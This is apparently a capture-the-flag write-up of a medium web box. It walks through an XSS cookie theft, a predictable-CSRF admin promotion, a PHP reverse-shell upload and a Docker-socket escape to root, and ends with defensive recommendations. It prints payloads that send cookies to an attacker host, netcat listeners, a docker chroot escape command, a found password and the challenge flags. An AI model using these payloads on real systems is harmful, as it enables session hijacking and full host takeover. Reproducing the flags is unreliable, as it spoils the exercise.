
# Sequence

Level: Medium
Date: May 06, 2026
Target IP: 10.114.158.228


## Description

Robert made some last-minute updates to the `review.thm` website before heading off on vacation. He claims that the secret information of the financiers is fully protected. But are his defenses truly airtight? Your challenge is to exploit the vulnerabilities and gain complete control of the system.

## Tasks

```
1. What is the flag value after logging in as mod?

2. What is the flag value after logging in as admin?
   
3. What is the flag value after getting root access to the system?
```

## Initial enumeration

```
nmap -sCV review.thm
```
![[Pasted image 20260506194304.png]]

Open ports:
- Port 22 (SSH)
- Port 80 (HTTP)
Possible web vulnerability:
`PHPSESSID` -> `httponly flag not set` -> `JS can read the cookie` 


## Web server enumeration

```
gobuster dir -u http://review.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,js,txt,py,html,css -t 50
```

![[Pasted image 20260506194843.png]]

A few interesting findings:
- /new.html
- /uploads
- /mail
- /db.php
- /settings.php
- /dashboard.php
- /phpmyadmin

Most of them were redirecting to index.php but /mail had an interesting finding:

![[Pasted image 20260506195504.png]]
![[Pasted image 20260506195622.png]]


Key findings in dump.txt:
- Both panels hosted on the `192.x` network.
- /finance.php
- /lottery.php
- Password -> S60u}f5j

## Visiting the web server

A page with a login form `Home` and contact form `Contact Us`

![[Pasted image 20260506194812.png]]


## Accessing mod (XSS - Cross-site scripting)

Tried the cross-site scripting idea and it worked through the Contact-form.
```javascript
<script>
  fetch('http://MYIP:8080/?c=' + document.cookie)
</script>
```

```bash
nc -lnvp 8080
```

![[Pasted image 20260506201220.png]]

![[Pasted image 20260506201438.png]]

From this we can read the PHPSESSID:
```
togfkko8uuj2vd4tv24savjs2r
```

With this I am attempting to change the cookie through devtools in Firefox in hope of gaining access to the mods cookie-session.

![[Pasted image 20260506202531.png]]

And that worked.
**Mod flag:** `THM{M0dH@ck3dPawned007}`

Upon clicking around at the website as mod I found some interesting things under `Settings`.
Maybe promoting my mod account to admin will give me more permissions. But unfortunately not.

![[Pasted image 20260506202811.png]]

![[Pasted image 20260506203045.png]]

![[Pasted image 20260506203103.png]]


## Accessing Admin (CSRF)

Findings under `home` and `chat`:

Home:
The admins id is 2.

Chat:
I can interact with the admin who is online. The same kind of Cookie-Hijacking technique might work against him if I send a similar payload to him and start a listener to fetch the cookie.

![[Pasted image 20260506203308.png]]

![[Pasted image 20260506203329.png]]


### Cookie Hijacking attempt 2

They are aware of this and probably has a filter. Gonna have to find another way around it.
```javascript
<img src=x onerror="fetch('http://MYIP:9001/?c='+document.cookie)">
```

```bash
nc -lnvp 9001
```

![[Pasted image 20260506204145.png]]

## CSRF (Cross-Site Request Forgery)

Heading back to the `settings` and intercepting the request when trying to promote my mod account we get a CSRF token. 
The CSRF token is the md5 hash of the username. By replacing mod's hash with the md5 hash of `admin`, I can forge a promotion request for the admin account instead.

![[Pasted image 20260506211626.png]]


The hash is a md5 type.

![[Pasted image 20260506211712.png]]



![[Pasted image 20260506212007.png]]


```html
<img src="http://review.thm/promote_coadmin.php?username=mod&csrf_token_promote=ad148a3ca8bd0ef3b48c52454c493ec5">
```


Instead of mod, I am changing the `mod` to `admin`. Hence forging the request.
Generate a md5 for `admin` -> `21232f297a57a5a743894a0e4a801fc3`

![[Pasted image 20260506213038.png]]


And then we send the payload with md5 hash of admin value instead of mod.

![[Pasted image 20260506213321.png]]


![[Pasted image 20260506213346.png]]


And now we are admin! 
**Admin flag:** `THM{Adm1NPawned007}`

## Investigating as admin

I had to log out and then use the same cookie since the refreshing the page didn't work. With this we have a new feature, `Lottery Feature`. 
From earlier in the `dump.txt` we know that there were 2 panels under construction, `finance.php` and `lottery.php`.

![[Pasted image 20260506213851.png]]


But there isn't much to it. So I decided to capture the request in Burp to see if there is something hidden when loading the `Lottery Feature`.
![[Pasted image 20260506215519.png]]


Changing the feature from `lottery.php` to `finance.php` and we are presented with a password requirement for the finance panel. 
Remember the `dump.txt`? There was a password in there.

(UPDATE: I realize now when cleaning up that I forgot to take a picture of the password pop-up, but using the password found in `dump.txt` worked.)

![[Pasted image 20260506220032.png]]


We are presented with a table of investors and a file upload. This screams reverse shell through file upload to me. 
And being logical the last flag is root's, so we will probably access the server through the terminal from here.

![[Pasted image 20260506220215.png]]

## Reverse shell through file upload

I will try the standard php-revshell already installed on Kali, changing IP, port and upload with a netcat listener on my Kali. Standard procedure.

Shell found in:
```
/usr/share/webshells/php/php-reverse-shell.php
```

![[Pasted image 20260506220917.png]]


The uploads folder runs on the internal server, so to trigger it, navigating to it via the URL doesn't work. Instead I triggered it the same way I did in Burp when accessing `/finance.php` by changing `feature` to `/uploads/shell.php`.
And we get a root shell. (At least I thought).

![[Pasted image 20260506221710.png]]


![[Pasted image 20260506221922.png]]

The box crashed unfortunately but I have everything logged just had to redo the steps, and then make a stable shell while I'm at it.

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")' 
Ctrl+Z 
stty raw -echo; fg 
export TERM=xterm
```

And we are back at it. 
But there are no obvious flags, and the `.dockerenv` confirms I'm in a docker container and not on the host yet.

![[Pasted image 20260506225019.png]]

## Docker escape

![[Pasted image 20260506225631.png]]

Escaping the docker-container
```bash
docker run -v /:/mnt --rm -it phpvulnerable chroot /mnt sh
```
Breakdown
`docker run` -> Starting a new container
`-v /:/mnt` -> Mounts the host-file system in a container as `/mnt`
`--rm` -> Removes the container as it closes
`-it` -> Interactive terminal
`phpvulnerable` -> The image in use locally
`chroot /mnt` -> Changes root-directory to `/mnt` - the host-file system
`sh` -> Starting a new root-shell

![[Pasted image 20260506230032.png]]

**Root flag:** `THM{rootAccessD0n3}`

## Summary

### Attack Chain
1. **Web Enumeration** → Gobuster discovered `/mail` containing `dump.txt` 
   with credentials and internal panel paths
2. **XSS via Contact Form** → Injected JavaScript payload to steal mod's 
   `PHPSESSID` cookie via netcat listener
3. **Cookie Hijacking** → Replaced session cookie in Firefox DevTools to 
   access mod's account
4. **CSRF Exploitation** → Forged promotion request by replacing mod's MD5 
   CSRF token with the MD5 hash of `admin`
5. **Admin Access** → Promoted mod account to admin via forged CSRF request
6. **Information Disclosure** → Changed `feature` parameter in Burp from 
   `lottery.php` to `finance.php` to access hidden finance panel
7. **File Upload RCE** → Uploaded PHP reverse shell, triggered it by changing 
   `feature` parameter to `/uploads/shell.php`
8. **Docker Escape** → Used exposed Docker socket to mount host filesystem 
   and `chroot` to root shell on host

---

### Key Vulnerabilities

**1. Information Disclosure via dump.txt**
```
/mail/dump.txt → internal panel paths + plaintext password
```
- Publicly accessible file with no authentication
- Exposed internal infrastructure and credentials

**2. Stored XSS via Contact Form**
```javascript
<script>fetch('http://ATTACKER:8080/?c=' + document.cookie)</script>
```
- No input sanitization on contact form
- `httponly` flag not set on `PHPSESSID` → cookie readable by JavaScript
- Allowed session hijacking of mod account

**3. Weak CSRF Implementation**
```
csrf_token_promote = md5(username)
```
- CSRF token is predictable – just the MD5 hash of the username
- Allows forging promotion requests for any account
- No server-side validation of token origin

**4. Insecure Direct Object Reference (IDOR)**
```
?feature=lottery.php → ?feature=finance.php
```
- Server trusts client-supplied `feature` parameter
- No authorization check on finance panel access

**5. Unrestricted File Upload**
```
php-reverse-shell.php → uploaded without restriction
```
- No file type validation on upload endpoint
- Allowed arbitrary PHP execution on the server

**6. Docker Socket Exposure**
```bash
docker run -v /:/mnt --rm -it phpvulnerable chroot /mnt sh
```
- Docker socket accessible from inside container
- Allows mounting host filesystem and escaping container as root

---

### Security Recommendations

**1. Cookie Security**
- Always set `HttpOnly` and `Secure` flags on session cookies
- Regenerate session ID on privilege change

**2. XSS Prevention**
- Sanitize and encode all user input before rendering
- Implement a Content Security Policy (CSP)

**3. CSRF Tokens**
- Never use predictable values like `md5(username)` as CSRF tokens
- Use cryptographically random tokens tied to the session

**4. File Upload Validation**
```php
// Bad
move_uploaded_file($_FILES['file']['tmp_name'], 'uploads/' . $_FILES['file']['name']);

// Good
$allowed = ['image/jpeg', 'image/png', 'image/gif'];
if (!in_array($_FILES['file']['type'], $allowed)) {
    die('Invalid file type');
}
```
- Whitelist allowed file types and extensions
- Store uploads outside webroot
- Never execute uploaded files

**5. Docker Hardening**
- Never expose the Docker socket inside containers
- Run containers as non-root users
- Use `--read-only` and `--no-new-privileges` flags

---

### Tools Used
- **nmap** – Port scanning and service detection
- **Gobuster** – Web directory enumeration
- **netcat** – XSS cookie listener
- **Firefox DevTools** – Cookie manipulation
- **Burp Suite** – Request interception and parameter manipulation
- **CrackStation** – MD5 hash identification

---

### Lessons Learned
1. **Always check `/mail` and similar directories** – internal dumps and 
   emails often contain credentials and infrastructure hints
2. **httponly flag matters** – without it, XSS can steal session cookies directly
3. **CSRF tokens must be unpredictable** – `md5(username)` is trivially forgeable
4. **Always test parameter values** – changing `feature=lottery.php` to 
   `feature=finance.php` bypassed access controls entirely
5. **File uploads are high-risk** – any upload functionality should be a 
   priority target
6. **Check for `.dockerenv`** – confirms container environment, pivot to 
   checking Docker socket for escape